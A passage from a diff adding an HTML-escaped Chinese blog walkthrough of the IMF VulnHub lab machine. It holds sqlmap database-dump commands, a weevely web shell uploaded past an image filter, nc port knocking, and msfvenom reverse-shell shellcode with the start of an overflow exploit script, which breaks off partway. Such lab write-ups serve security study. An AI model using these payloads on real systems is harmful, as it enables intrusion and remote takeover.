+		data-flex-basis=&#34;416px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;抓包，传入数组测试。绕过成功&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Flag3{Y29udGludWVUT2Ntcw==}&lt;/code&gt;解码continueTOcms&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905.png&#34;
+	width=&#34;947&#34;
+	height=&#34;584&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905_hu9ee7d87c15b4c914f8367be5b7887524_47014_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095226905_hu9ee7d87c15b4c914f8367be5b7887524_47014_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519095226905&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;162&#34;
+		data-flex-basis=&#34;389px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905.png&#34;
+	width=&#34;612&#34;
+	height=&#34;242&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905_hu4a3b392eb941e8e890398ebbdeb960a2_17113_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095300905_hu4a3b392eb941e8e890398ebbdeb960a2_17113_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519095300905&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;252&#34;
+		data-flex-basis=&#34;606px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;登录成功后，发现啥都没有&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340.png&#34;
+	width=&#34;1158&#34;
+	height=&#34;685&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340_hu954fb333047a875a704ced7c680d0fdf_204777_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519095628340_hu954fb333047a875a704ced7c680d0fdf_204777_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519095628340&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;405px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;尝试爆破二级目录。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359.png&#34;
+	width=&#34;773&#34;
+	height=&#34;464&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359_hub6cce45d2e29b888ddd8db0dac2d2ec2_203612_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101035359_hub6cce45d2e29b888ddd8db0dac2d2ec2_203612_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519101035359&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;166&#34;
+		data-flex-basis=&#34;399px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;有文件上传的目录，但是没有上传点&lt;/p&gt;
+&lt;p&gt;Url是可以传参的，试试sqlmap&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073.png&#34;
+	width=&#34;863&#34;
+	height=&#34;373&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073_hu79a4a68d1760f491f32b903fa82bdda1_71251_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101435073_hu79a4a68d1760f491f32b903fa82bdda1_71251_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519101435073&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;231&#34;
+		data-flex-basis=&#34;555px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -u &amp;quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&amp;quot; --dbs --batch --cookie=&amp;quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;得到数据库，测试admin数据库下的唯一表 pages&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745.png&#34;
+	width=&#34;542&#34;
+	height=&#34;189&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745_hu200a9470a831cb6a9b72fa63233ed920_86643_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519101642745_hu200a9470a831cb6a9b72fa63233ed920_86643_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519101642745&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;286&#34;
+		data-flex-basis=&#34;688px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -u &amp;quot;http://192.168.100.142/imfadministrator/cms.php?pagename=disavowlist&amp;quot;  --batch --cookie=&amp;quot;PHPSESSID=fb579gndjr8b3m9hojis09o3r6&amp;quot; -D admin  -T pages --dump&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579.png&#34;
+	width=&#34;1252&#34;
+	height=&#34;417&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579_hu9b412726d0df76a6ce98a4d238f0db09_398261_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102234579_hu9b412726d0df76a6ce98a4d238f0db09_398261_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519102234579&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;300&#34;
+		data-flex-basis=&#34;720px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;访问得知，有一个图片，扫描得到&lt;code&gt;Flag4{dXBsb2Fkcjk0Mi5waHA=}&lt;/code&gt;解码得&lt;code&gt;uploadr942.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957.png&#34;
+	width=&#34;1182&#34;
+	height=&#34;756&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957_hu761ef47d34dc6e09e42e048ad9f8dd62_315973_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102401957_hu761ef47d34dc6e09e42e048ad9f8dd62_315973_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519102401957&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;156&#34;
+		data-flex-basis=&#34;375px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082.png&#34;
+	width=&#34;531&#34;
+	height=&#34;671&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082_huaaa436227df5eb54c126b7f28a9252f7_90113_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519102442082_huaaa436227df5eb54c126b7f28a9252f7_90113_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519102442082&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;79&#34;
+		data-flex-basis=&#34;189px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;访问上传页面目测只能上传图片，并且通过文件头和末尾判断，有htaccess文件&lt;/p&gt;
+&lt;p&gt;使用weevely生成木马 带密码的&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;weevely generate 1234 shell.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在头部添加进行绕过,源码有提示得文件名&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909.png&#34;
+	width=&#34;1132&#34;
+	height=&#34;825&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909_hu1d1f9b4bdf33b37d0eed273cdceeb997_58022_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104116909_hu1d1f9b4bdf33b37d0eed273cdceeb997_58022_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519104116909&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;137&#34;
+		data-flex-basis=&#34;329px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619.png&#34;
+	width=&#34;686&#34;
+	height=&#34;377&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619_huba07b4ae6b0d55cc97435dd15d65a1b5_19322_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519104126619_huba07b4ae6b0d55cc97435dd15d65a1b5_19322_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519104126619&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;181&#34;
+		data-flex-basis=&#34;436px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;连接木马&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;weevely http://192.168.100.142/imfadministrator/uploads/8cf3502f3c52.gif  1234&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;查看Flag5_abc123def.txt&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441.png&#34;
+	width=&#34;873&#34;
+	height=&#34;461&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441_hu5c34177960d4eed13caf61ad5de80d4f_400818_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205524441_hu5c34177960d4eed13caf61ad5de80d4f_400818_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220518205524441&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;189&#34;
+		data-flex-basis=&#34;454px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;得到提示&lt;code&gt;echo &amp;quot;YWdlbnRzZXJ2aWNlcw==&amp;quot; | base64 -d&lt;/code&gt;, 还运行着一个叫agent的服务&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414.png&#34;
+	width=&#34;585&#34;
+	height=&#34;110&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414_hu9cb80bd87c3b5fd4e54e6f93e1833b0b_58619_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205243414_hu9cb80bd87c3b5fd4e54e6f93e1833b0b_58619_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220518205243414&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;531&#34;
+		data-flex-basis=&#34;1276px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;查看同级目录下的文件，接入的端口7482 8279 9467&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903.png&#34;
+	width=&#34;532&#34;
+	height=&#34;322&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903_huf9bf1c8220aa8750902be9dc9751b5bc_158348_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518205852903_huf9bf1c8220aa8750902be9dc9751b5bc_158348_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220518205852903&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;165&#34;
+		data-flex-basis=&#34;396px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;对于Agent这个程序的分析&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://g0blin.co.uk/imf-vulnhub-writeup/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;g0blin Research: IMF VulnHub Writeup&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.icode9.com/content-4-893866.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;OSCP IMF &lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;得知要进行端口敲门，才能进行访问代理的端口&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/382577136&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;端口保护从端口敲门到单包授权&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;方法一：&lt;/p&gt;
+&lt;p&gt;下载工具&lt;code&gt;git clone https://github.com/grongor/knock.git&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在KALI进行端口敲门测试&amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021.png&#34;
+	width=&#34;675&#34;
+	height=&#34;311&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021_hu8fd9b31e3ad76d7219d75af32856cd04_179622_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210544021_hu8fd9b31e3ad76d7219d75af32856cd04_179622_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220518210544021&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;217&#34;
+		data-flex-basis=&#34;520px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;方法二：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;使用nc依此对3个端口进行连接，即发送SYN数据包
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nv 192.168.100.142 &lt;span class=&#34;m&#34;&gt;7482&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nv 192.168.100.142 &lt;span class=&#34;m&#34;&gt;8279&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -nv 192.168.100.142 &lt;span class=&#34;m&#34;&gt;9467&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;方法三：&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;Scapy&lt;/code&gt;工具或者Python的&lt;code&gt;Scapy.all&lt;/code&gt;模块发送SYN数据包&lt;/p&gt;
+&lt;p&gt;对外开放了一个7788端口&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731.png&#34;
+	width=&#34;523&#34;
+	height=&#34;172&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731_hu62530c49ef86fd074ff6449bc8fce953_64571_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220519112551731_hu62530c49ef86fd074ff6449bc8fce953_64571_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220519112551731&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;304&#34;
+		data-flex-basis=&#34;729px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319.png&#34;
+	width=&#34;921&#34;
+	height=&#34;270&#34;
+	srcset=&#34;http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319_hubeb036de457c2b08fea4a6d604f6a2d0_269138_480x0_resize_box_3.png 480w, http://main1o.eu.org/p/imf%E9%9D%B6%E6%9C%BA/image-20220518210702319_hubeb036de457c2b08fea4a6d604f6a2d0_269138_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20220518210702319&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;341&#34;
+		data-flex-basis=&#34;818px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;分析Agent知道需要进行溢出&lt;/p&gt;
+&lt;p&gt;生成ShellCode，溢出拿到权限&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.100.101 lport=8877 -f python -b &amp;quot;\x00\x0a\x0d&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;  b&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\xba\x74\x40\x7e\xaf\xda\xd6\xd9\x74\x24\xf4\x58\x29&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\xc9\xb1\x12\x31\x50\x12\x83\xe8\xfc\x03\x24\x4e\x9c&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x5a\xf5\x95\x97\x46\xa6\x6a\x0b\xe3\x4a\xe4\x4a\x43&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x2c\x3b\x0c\x37\xe9\x73\x32\xf5\x89\x3d\x34\xfc\xe1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x7d\x6e\x9a\x94\x15\x6d\x63\x74\x4b\xf8\x82\xc8\xf5&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\xab\x15\x7b\x49\x48\x1f\x9a\x60\xcf\x4d\x34\x15\xff&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x02\xac\x81\xd0\xcb\x4e\x3b\xa6\xf7\xdc\xe8\x31\x16&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;buf&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; b&lt;span class=&#34;s2&#34;&gt;&amp;#34;\x50\x05\x8f\x59&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Python脚本&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# /usr/bin/python2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;client&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AF_INET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;socket&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
